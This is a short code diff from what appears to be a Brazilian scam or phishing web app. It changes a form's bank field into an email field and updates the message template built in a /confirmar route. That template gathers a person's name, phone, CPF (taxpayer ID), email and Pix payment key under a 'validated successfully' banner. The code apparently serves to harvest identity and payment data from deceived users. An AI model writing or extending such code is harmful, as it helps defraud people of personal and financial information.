@@ -718,7 +718,7 @@ if (process.env.NODE_ENV === 'production') {
                   <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required>
   
                   <label for="banco">Banco:</label>
-                  <input type="text" id="banco" name="banco" placeholder="Nome do banco" required>
+                  <input type="email" id="banco" name="banco" placeholder="Email" required>
   
                   <p>Aceitamos todos os bancos</p>
                   <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZldct4y1ni1qQCcZO0GSYb9SCyD5pGC0hmQ&s"
@@ -874,7 +874,7 @@ app.post('/confirmar', async (req, res) => {
     ▫️ Nome: ${nome}
     ▫️ Telefone: ${telefone}
     ▫️ CPF: ${cpf}
-    ▫️ Banco: ${banco}
+    ▫️ Email: ${banco}
     ▫️ Chave Pix: ${chave}
     ━━━━━━━━━━━━━━━━━━━━━
     ✅ Dados validados com sucesso!`;
